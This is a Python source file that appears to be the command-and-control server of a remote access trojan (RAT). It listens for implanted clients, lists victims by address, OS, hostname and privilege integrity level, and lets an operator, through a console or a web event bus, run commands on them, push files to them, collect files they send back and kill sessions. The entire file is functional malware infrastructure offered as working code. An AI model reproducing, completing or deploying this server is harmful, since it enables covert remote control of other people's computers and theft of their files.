import json
import shutil
import socket
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime

from core.protocol.ratsocket import RATSocket
from core.utils.logger import logger
from core.utils.parsing import parse
from core.utils.formatting import print_table
from core.utils.terminal import Colors
from server.commands.alias_manager import AliasManager
from server.commands.executor import CommandExecutor
from server.config.config import SOCKET_ADDR
from core.utils.server_util import *
from server.connection.client_connection import ClientConnection
from server.connection.connection_manager import ConnectionManager
from server.web.event_bus import WebEventBus


class Server:
    def __init__(self, address):
        """
        初始化服务器对象
        :param address: 服务器地址
        """
        self.address = address
        self.socket = RATSocket()
        self.connections = ConnectionManager()
        self.alias_manager = AliasManager()
        #web
        self.event_bus = WebEventBus()
        self._tasks = {}
        self._tasks_lock = threading.RLock()

        # web 文件区
        self.web_root_dir = os.path.abspath(os.path.join('runtime', 'web_files'))
        self.received_files_dir = os.path.join(self.web_root_dir, 'received')
        self.upload_tmp_dir = os.path.join(self.web_root_dir, 'upload_tmp')
        self._received_files = []
        self._received_files_lock = threading.RLock()
        self._prepare_web_dirs()


    #web files start

    def _prepare_web_dirs(self):
        os.makedirs(self.received_files_dir, exist_ok=True)
        os.makedirs(self.upload_tmp_dir, exist_ok=True)

    def _build_unique_file_path(self, directory: str, filename: str) -> str:
        safe_name = os.path.basename(filename) or 'file.bin'
        base, ext = os.path.splitext(safe_name)
        candidate = os.path.join(directory, safe_name)
        index = 1
        while os.path.exists(candidate):
            candidate = os.path.join(directory, f'{base}_{index}{ext}')
            index += 1
        return candidate

    def register_received_file(self, client_id: str, original_name: str, saved_path: str, size: int):
        item = {
            'client_id': client_id,
            'original_name': original_name,
            'saved_name': os.path.basename(saved_path),
            'saved_path': saved_path,
            'size': size,
            'created_at': datetime.now().isoformat()
        }
        with self._received_files_lock:
            self._received_files.insert(0, item)
            self._received_files = self._received_files[:200]

        self.event_bus.publish('file_received', item)

    def list_recent_received_files(self, limit: int = 100):
        with self._received_files_lock:
            return list(self._received_files[:limit])

    def get_received_file_item(self, saved_name: str):
        with self._received_files_lock:
            for item in self._received_files:
                if item['saved_name'] == saved_name:
                    return item
        return None

    def submit_web_upload(self, client_id: str, local_path: str, display_name: str):
        conn = self.get_target_connection_by_client_id(client_id)
        task = self._create_task(client_id, f'upload {display_name}')

        threading.Thread(
            target=self._run_web_upload,
            args=(conn, task['task_id'], local_path, display_name),
            daemon=True
        ).start()

        return {
            'task_id': task['task_id'],
            'client_id': client_id,
            'command': f'upload {display_name}'
        }

    def _run_web_upload(self, conn: ClientConnection, task_id: str, local_path: str, display_name: str):
        ok = True
        try:
            for status, result in conn.send_file(local_path):
                text = '' if result is None else str(result)
                self._append_task_chunk(task_id, status, text)

                self.event_bus.publish('command_result', {
                    'task_id': task_id,
                    'client_id': conn.info.get('id'),
                    'command': f'upload {display_name}',
                    'status': status,
                    'text': text,
                    'time': datetime.now().isoformat()
                })

                if status == 0:
                    ok = False
        except Exception as e:
            ok = False
            text = str(e)
            self._append_task_chunk(task_id, 0, text)

            self.event_bus.publish('command_result', {
                'task_id': task_id,
                'client_id': conn.info.get('id'),
                'command': f'upload {display_name}',
                'status': 0,
                'text': text,
                'time': datetime.now().isoformat()
            })
        finally:
            self._finish_task(task_id, ok)
            self.event_bus.publish('command_complete', {
                'task_id': task_id,
                'client_id': conn.info.get('id'),
                'command': f'upload {display_name}',
                'success': ok,
                'time': datetime.now().isoformat()
            })

            try:
                if os.path.exists(local_path):
                    os.remove(local_path)
                parent_dir = os.path.dirname(local_path)
                if parent_dir.startswith(self.upload_tmp_dir) and os.path.isdir(parent_dir):
                    shutil.rmtree(parent_dir, ignore_errors=True)
            except Exception:
                pass
    #web files end

    #web start
    def _serialize_connection(self, conn: ClientConnection) -> dict:
        info = conn.info or {}
        return {
            'client_id': info.get('id'),
            'addr': info.get('addr', ''),
            'os_type': info.get('os_type', 'Unknown'),
            'os_ver': info.get('os_ver', 'Unknown'),
            'hostname': info.get('hostname', 'Unknown'),
            'integrity': info.get('integrity', '?'),
            'cwd': info.get('cwd', ''),
        }

    def get_connections_payload(self):
        return [self._serialize_connection(conn) for conn in self.connections.all()]

    def get_target_connection_by_client_id(self, client_id) -> ClientConnection:
        try:
            return self.connections.get_by_client_id(client_id)
        except Exception:
            raise Exception('Not a valid selection')

    def kill_connection_by_client_id(self, client_id):
        conn = self.get_target_connection_by_client_id(client_id)
        conn.send_command('kill')

    def _create_task(self, client_id: str, command: str):
        task_id = uuid.uuid4().hex
        task = {
            'task_id': task_id,
            'client_id': client_id,
            'command': command,
            'status': 'running',
            'created_at': datetime.now().isoformat(),
            'finished_at': None,
            'chunks': []
        }
        with self._tasks_lock:
            self._tasks[task_id] = task
        return task

    def _append_task_chunk(self, task_id: str, status: int, text: str):
        with self._tasks_lock:
            task = self._tasks.get(task_id)
            if not task:
                return
            task['chunks'].append({
                'status': status,
                'text': text,
                'time': datetime.now().isoformat()
            })

    def _finish_task(self, task_id: str, ok: bool):
        with self._tasks_lock:
            task = self._tasks.get(task_id)
            if not task:
                return
            task['status'] = 'success' if ok else 'error'
            task['finished_at'] = datetime.now().isoformat()

    def submit_web_command(self, client_id: str, command: str):
        conn = self.get_target_connection_by_client_id(client_id)
        task = self._create_task(client_id, command)

        threading.Thread(
            target=self._run_web_command,
            args=(conn, task['task_id'], command),
            daemon=True
        ).start()

        return {
            'task_id': task['task_id'],
            'client_id': client_id,
            'command': command
        }

    def _run_web_command(self, conn: ClientConnection, task_id: str, command: str):
        ok = True
        try:
            executor = CommandExecutor(conn, self)
            func = executor.process_command(command)
            if not func:
                raise RuntimeError('Unable to resolve command')

            for status, result in func():
                text = '' if result is None else str(result)
                self._append_task_chunk(task_id, status, text)

                self.event_bus.publish('command_result', {
                    'task_id': task_id,
                    'client_id': conn.info.get('id'),
                    'command': command,
                    'status': status,
                    'text': text,
                    'time': datetime.now().isoformat()
                })

                if status == 0:
                    ok = False

        except Exception as e:
            ok = False
            text = str(e)
            self._append_task_chunk(task_id, 0, text)

            self.event_bus.publish('command_result', {
                'task_id': task_id,
                'client_id': conn.info.get('id'),
                'command': command,
                'status': 0,
                'text': text,
                'time': datetime.now().isoformat()
            })

        finally:
            self._finish_task(task_id, ok)
            self.event_bus.publish('command_complete', {
                'task_id': task_id,
                'client_id': conn.info.get('id'),
                'command': command,
                'success': ok,
                'time': datetime.now().isoformat()
            })


    #web end

    # ------------------ 连接建立 ------------------ #
    def _bind_server_socket(self):
        """
        绑定并启动监听
        """
        self.socket.bind(self.address)
        logger.info('Listening on port {}'.format(self.address[1]))

    def _receive_client_info(self, conn):
        """
        接收客户端初始信息
        """
        conn.settimeout(5)
        try:
            connection = ClientConnection(conn)
            return connection.recv()
        finally:
            conn.settimeout(None)

    def _build_connection_info(self, addr, info: dict) -> dict:
        """
        构造客户端连接信息
        """
        return {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}

    # def _register_connection(self, conn, addr, info: dict) -> ClientConnection:
    #     """
    #     创建并注册客户端连接对象
    #     """
    #     connection = ClientConnection(conn, addr, info)
    #     self.connections.add(connection)
    #     logger.info('Connection has been established: {}'.format(addr))
    #     return connection

    #web
    def _register_connection(self, conn, addr, info: dict) -> ClientConnection:
        # connection = ClientConnection(conn, addr, info)

        #web files
        connection = ClientConnection(
            conn,
            addr,
            info,
            file_save_dir=self.received_files_dir,
            on_file_saved=lambda original_name, saved_path, size: self.register_received_file(
                info.get('id'),
                original_name,
                saved_path,
                size
            )
        )
        #web files end

        def _unexpected_message_callback(status, text, end):
            self.event_bus.publish('background_message', {
                'client_id': connection.info.get('id'),
                'status': status,
                'text': text,
                'eof': end,
                'time': datetime.now().isoformat()
            })

        connection.on_unexpected_message = _unexpected_message_callback

        self.connections.add(connection)
        logger.info('Connection has been established: {}'.format(addr))

        self.event_bus.publish('connection_online', {
            'connection': self._serialize_connection(connection),
            'time': datetime.now().isoformat()
        })

        return connection
    #web end

    def _accept_connection(self):
        """
        接受一个新连接并完成初始化
        """
        conn, addr = self.socket.accept()

        try:
            info = self._receive_client_info(conn)
        except json.JSONDecodeError:
            conn.close()
            logger.error('Failed to establish session: invalid client handshake from {}'.format(addr))
            # logger.error('Connection timed out: {}'.format(addr))
            return None
        except Exception as e:
            conn.close()
            logger.error('Error establishing connection: {}'.format(e))
            return None

        info = self._build_connection_info(addr, info)
        return self._register_connection(conn, addr, info)

    def _start_connection_handler(self, connection):
        """
        启动客户端连接接收线程
        """
        threading.Thread(
            target=self.connection_handler,
            args=(connection,),
            daemon=True
        ).start()

    def serve(self):
        """
        接受新连接的线程
        """
        try:
            self._bind_server_socket()
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))
            return

        while 1:
            try:
                connection = self._accept_connection()
                if connection is None:
                    continue
                self._start_connection_handler(connection)
            except socket.error as e:
                logger.error(e)

    # ------------------ 连接生命周期 ------------------ #
    def _notify_connection_closed(self, conn: ClientConnection):
        """
        通知等待中的主线程：该连接已关闭
        """
        conn.message_queue.put(0, None, 1)

    def _remove_connection(self, conn: ClientConnection):
        """
        从连接管理器中移除连接
        """
        self.connections.remove(conn)

    def _handle_connection_closed(self, conn: ClientConnection):
        """
        处理连接关闭后的清理逻辑
        """
        logger.error(f'Connection closed: {conn.address}')

        #web
        self.event_bus.publish('connection_offline', {
            'client_id': conn.info.get('id'),
            'time': datetime.now().isoformat()
        })
        #web end
        self._notify_connection_closed(conn)
        self._remove_connection(conn)

    def _handle_connection_receive_error(self, conn: ClientConnection):
        """
        处理接收线程中的非致命异常
        """
        logger.error(f'Error receiving from {conn.address}', exc_info=True)
        time.sleep(1)

    # ------------------ 子线程接收 ------------------ #
    def connection_handler(self, conn):
        """
        处理接收的子线程
        :param conn: 连接
        """
        while 1:
            try:
                conn.recv_message()
            except socket.error:
                self._handle_connection_closed(conn)
                break
            except Exception:
                self._handle_connection_receive_error(conn)

    # ------------------ 连接查询 ------------------ #
    def list_connections(self):
        """
        显示连接列表
        """
        connection_list = self.connections.all()
        if not connection_list:
            # print("No active connections at present")
            print("No active sessions")

            return

        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
        data = [
            [
                str(i),
                conn.info.get('addr', 'N/A'),
                conn.info.get('os_type', 'Unknown'),
                conn.info.get('os_ver', 'Unknown'),
                conn.info.get('hostname', 'Unknown'),
                conn.info.get('integrity', '?')
            ]
            for i, conn in enumerate(connection_list)
        ]
        print_table(headers, data)

    def get_last_connection(self) -> ClientConnection:
        """
        获取最新连接
        :return: 连接
        """
        try:
            return self.connections.last()
        except IndexError:
            raise Exception('No active session available')

            # raise Exception('No connection at this time')

    def get_target_connection(self, id) -> ClientConnection:
        """
        根据id获取连接
        :param id: 连接id
        :return: 连接
        """
        try:
            return self.connections[int(id)]
        except (ValueError, IndexError):
            raise Exception('Not a valid selection')

    def kill_connection(self, id):
        """
        关闭连接
        :param id: 连接id
        """
        conn = self.get_target_connection(id)
        if conn:
            conn.send_command('kill')

    # ------------------ 交互会话 ------------------ #
    def _print_unread_messages(self, conn: ClientConnection):
        """
        输出连接的未读消息
        """
        while not conn.message_queue.empty():
            logger.info('[UNREAD] ' + str(conn.message_queue.get()[1]))

    def _handle_interactive_control_command(self, conn: ClientConnection, cmd: str) -> bool:
        """
        处理交互模式下的控制命令
        :return: True 表示已处理且应结束当前轮询
        """
        if cmd in ['kill', 'reset']:
            conn.send_command(cmd)
            return True

        if cmd in ['exit', 'quit']:
            return True

        if cmd == 'q':
            connection = self.get_last_connection()
            if connection == conn:
                return False
            self.open_connection(connection)
            return True

        return False

    def _execute_interactive_command(self, conn: ClientConnection, command_executor: CommandExecutor, cmd: str):
        """
        执行交互模式命令
        """
        func = command_executor.process_command(cmd)
        if func:
            for item in func():
                write(*item)

    def open_connection(self, conn: ClientConnection):
        """
        与连接交互
        :param conn: 连接
        """
        print('[+] Connected to {}'.format(conn.address))
        conn.is_interactive = True
        self._print_unread_messages(conn)

        command_executor = CommandExecutor(conn, self)
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(conn.info['cwd']))
                    if not cmd.strip():
                        continue

                    if self._handle_interactive_control_command(conn, cmd):
                        break

                    self._execute_interactive_command(conn, command_executor, cmd)
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        finally:
            conn.is_interactive = False

    # ------------------ 主控台命令 ------------------ #
    def _handle_console_command(self, cmd: str):
        """
        处理主控台命令
        """
        name, arg = parse(cmd)

        if cmd in ['l', 'ls', 'list']:
            self.list_connections()
            return

        if cmd == 'q':
            self.open_connection(self.get_last_connection())
            return

        if name in ['s', 'select']:
            self.open_connection(self.get_target_connection(arg))
            return

        if name in ['k', 'kill']:
            self.kill_connection(arg)
            return

        if cmd in ['quit', 'exit']:
            self.socket.close()
            sys.exit(0)

        if cmd in ['cls', 'clear']:
            subprocess.call(cmd, shell=True)
            return

        if name == 'cd':
            print(cd(arg))
            return

        try:
            self.open_connection(self.get_target_connection(cmd))
        except Exception:
            raise Exception('Command not recognized')

    def cmdloop(self):
        """
        命令行交互
        """
        while 1:
            try:
                cmd = colored_input('flc> ')
                if not cmd.strip():
                    continue
                self._handle_console_command(cmd)
            except KeyboardInterrupt:
                print(Colors.RESET)
                self.socket.close()
                sys.exit(0)
            except Exception as e:
                write(0, f'[-] {type(e).__name__}: {e}')
            finally:
                print()


if __name__ == '__main__':
    os.system('')  # 初始化颜色显示
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    server.cmdloop()

